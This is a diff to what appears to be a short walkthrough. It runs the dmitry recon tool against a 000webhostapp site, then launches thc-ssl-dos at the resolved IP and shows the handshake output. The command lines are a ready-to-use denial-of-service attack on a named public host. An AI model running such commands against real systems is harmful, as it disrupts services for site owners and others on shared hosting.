@@ -57,7 +57,7 @@ i want to test my website:
 let's see ip adress
 
 run this command
-```
+```bash
 dmitry samglishinc.000webhostapp.com
 ```
 Output
@@ -71,8 +71,14 @@ HostName:samglishinc.000webhostapp.com
 Gathered Inet-whois information for 145.14.145.210
 ---------------------------------
 ```
-let's test the tools.
-```
+
+```bash
 thc-ssl-dos 145.14.145.210 --accept
 ```
 
+```
+Waiting for script kiddies to piss off................
+The force is with those who read the source...
+Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
+Handshakes 4[4.310 h/s], 2 Conn, 0 Err
+```
